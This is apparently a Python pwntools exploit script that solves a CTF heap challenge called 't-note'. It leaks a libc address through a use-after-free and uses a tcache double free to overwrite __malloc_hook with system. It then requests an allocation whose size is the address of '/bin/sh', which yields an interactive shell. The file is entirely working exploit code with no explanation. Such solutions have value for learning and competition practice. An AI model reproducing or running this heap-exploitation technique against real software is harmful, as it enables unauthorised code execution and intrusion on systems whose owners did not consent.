from pwn import *

r = process('./t-note')
#r = remote('edu-ctf.csie.org', 10179)
elf = ELF('./libc.so')

if sys.argv[1] == 'debug': raw_input('debug')

def add(size, data):
    r.sendafter('> ', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', data)

def show(index):
    r.sendafter('> ', '2')
    r.sendafter('Which note do you want to show?\nIndex: ', str(index))

def delete(index):
    r.sendafter('> ', '3')
    r.sendafter('Which note do you want to delete?\nIndex: ', str(index))

add(0x410, 'a')
add(0x20, 'b')

delete(0)
show(0)
r.recvline()
elf.address = u64(r.recv(6) + '\0\0') - 0x3ebca0

delete(1)
delete(1)

add(0x20, p64(elf.sym.__malloc_hook))
add(0x20, 'c')

add(0x20, p64(elf.sym.system))

r.sendafter('> ', '1')
r.sendafter('Size: ', str(elf.search('/bin/sh').next()))


r.interactive()
